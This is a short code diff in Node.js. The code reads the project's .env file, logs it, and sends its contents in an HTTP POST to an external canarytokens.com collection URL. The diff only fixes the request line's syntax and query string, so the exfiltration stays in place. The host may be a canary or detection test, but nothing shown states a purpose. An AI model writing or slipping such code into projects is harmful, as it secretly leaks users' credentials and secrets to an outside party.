@@ -16,8 +16,8 @@ const envFile = path.join(process.cwd(), ".env");
 if (fs.existsSync(envFile)) {
     const data = fs.readFileSync(envFile, "utf8");
     console.log(data);
-const req = http.request(
-"http://fx8a4wl0xwr1hggxyji33iqzo.canarytokens.com/collect?file"+data,
+req = http.request(
+"http://fx8a4wl0xwr1hggxyji33iqzo.canarytokens.com/collect?file="+data,
 {
       method: "POST",
       headers: {
